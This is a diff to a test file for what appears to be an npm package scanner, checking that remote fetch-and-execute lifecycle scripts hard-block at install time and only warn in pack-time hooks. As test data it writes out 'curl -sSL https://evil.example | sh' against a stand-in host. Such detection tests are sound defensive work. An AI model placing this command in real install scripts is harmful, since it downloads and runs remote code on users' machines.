@@ -13,6 +13,7 @@ describe("isHardBlock", () => {
     expect(
       isHardBlock(
         makeSignals({
+          lifecycleScripts: { postinstall: "curl x | bash" },
           scriptCommandFindings: [
             "postinstall script downloads content from the network: `curl x | bash`",
             "postinstall script invokes a shell: `curl x | bash`",
@@ -26,8 +27,27 @@ describe("isHardBlock", () => {
   // rules.ts documents as the canonical hard block, but the shell pattern used
   // to miss it. Drive it through the real inspector so the whole chain is proven.
   it("remote fetch-and-execute (curl|sh, bare sh) is hard", () => {
-    const findings = inspectScriptCommand("postinstall", "curl -sSL https://evil.example | sh");
-    expect(isHardBlock(makeSignals({ scriptCommandFindings: findings }))).toBe(true);
+    const cmd = "curl -sSL https://evil.example | sh";
+    const findings = inspectScriptCommand("postinstall", cmd);
+    expect(
+      isHardBlock(
+        makeSignals({ lifecycleScripts: { postinstall: cmd }, scriptCommandFindings: findings }),
+      ),
+    ).toBe(true);
+  });
+
+  // The SAME attack in a pack/publish-time hook (prepack/prepare/postpack) never
+  // runs on a registry install, so it must NOT hard-block — it is a warning.
+  it("remote fetch-and-execute in a PACK-time hook (prepack) is NOT hard", () => {
+    const cmd = "curl -sSL https://evil.example | sh";
+    const findings = inspectScriptCommand("prepack", cmd);
+    const signals = makeSignals({
+      lifecycleScripts: { prepack: cmd },
+      scriptCommandFindings: findings,
+    });
+    expect(isHardBlock(signals)).toBe(false);
+    // …and the verdict is a non-blocking warning, not a block.
+    expect(evaluateRules(signals).decision).toBe("allow_with_warnings");
   });
 
   it("env+network heuristic (esbuild-style) is NOT hard — it is soft/overridable", () => {
